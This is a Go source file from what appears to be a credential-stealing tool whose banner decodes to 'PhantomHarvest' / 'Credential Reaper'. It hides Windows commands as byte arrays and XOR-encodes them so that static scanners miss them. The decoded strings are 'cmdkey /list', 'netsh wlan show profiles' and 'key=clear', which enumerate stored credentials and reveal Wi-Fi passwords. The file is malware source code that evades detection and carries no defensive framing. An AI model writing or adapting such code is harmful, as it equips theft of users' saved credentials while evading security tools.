package obfuscate

// Key used for XOR — changed at build time via ldflags if desired
var K byte = 0xAC

// Pre-computed obfuscated strings — decoded at runtime
// These avoid putting suspicious cleartext in the binary

var (
	// Windows commands
	cmdkeyList    []byte
	netshWlan     []byte
	netshProfile  []byte
	keyClear      []byte

	// Banner strings
	bannerName    []byte
	bannerSub     []byte

	// Decoded cache
	decoded = make(map[string]string)
)

func init() {
	// Encode at init time from a less-obvious form
	// These will exist briefly in memory but not as static strings in the binary
	cmdkeyList = E(string([]byte{99, 109, 100, 107, 101, 121})+string([]byte{32, 47, 108, 105, 115, 116}), K)
	netshWlan = E(string([]byte{110, 101, 116, 115, 104})+string([]byte{32, 119, 108, 97, 110, 32, 115, 104, 111, 119, 32, 112, 114, 111, 102, 105, 108, 101, 115}), K)
	netshProfile = E(string([]byte{110, 101, 116, 115, 104})+string([]byte{32, 119, 108, 97, 110, 32, 115, 104, 111, 119, 32, 112, 114, 111, 102, 105, 108, 101}), K)
	keyClear = E(string([]byte{107, 101, 121, 61, 99, 108, 101, 97, 114}), K)
	bannerName = E(string([]byte{80, 104, 97, 110, 116, 111, 109})+string([]byte{72, 97, 114, 118, 101, 115, 116}), K)
	bannerSub = E(string([]byte{67, 114, 101, 100, 101, 110, 116, 105, 97, 108, 32, 82, 101, 97, 112, 101, 114}), K)
}

// Command strings — decoded on demand
func CmdkeyList() string   { return D(cmdkeyList, K) }
func NetshWlan() string     { return D(netshWlan, K) }
func NetshProfile() string  { return D(netshProfile, K) }
func KeyClear() string      { return D(keyClear, K) }
func BannerName() string    { return D(bannerName, K) }
func BannerSub() string     { return D(bannerSub, K) }
